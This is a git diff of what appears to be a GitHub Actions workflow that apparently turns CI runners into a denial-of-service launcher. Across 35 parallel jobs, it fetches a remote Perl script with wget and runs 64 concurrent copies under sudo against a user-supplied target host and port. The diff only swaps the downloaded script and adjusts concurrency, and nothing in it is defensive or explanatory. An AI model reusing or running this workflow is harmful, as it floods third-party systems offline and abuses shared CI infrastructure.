@@ -1,4 +1,4 @@
-name: TekilPro !
+name: Tekil2 !
 
 on:
   workflow_dispatch:
@@ -18,8 +18,8 @@ jobs:
     strategy:
       max-parallel: 35
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35]
-        
+        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35]
+
     steps:
       - name: Checkout (optional)
         uses: actions/checkout@v4
@@ -29,12 +29,12 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/apc.pl -O TekilPro.pl
-          chmod +x TekilPro.pl || true
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/hoplatici.pl -O Hoplatici.pl
+          chmod +x Hoplatici.pl || true
 
           PIDS=()
-          for i in {1..96}; do
-            sudo timeout 30 perl TekilPro.pl "$TARGET" "$PORT" 1400 30 &
+          for i in {1..64}; do
+            sudo timeout 30 perl Hoplatici.pl "$TARGET" "$PORT" 1400 30 &
             PIDS+=($!)
           done
 
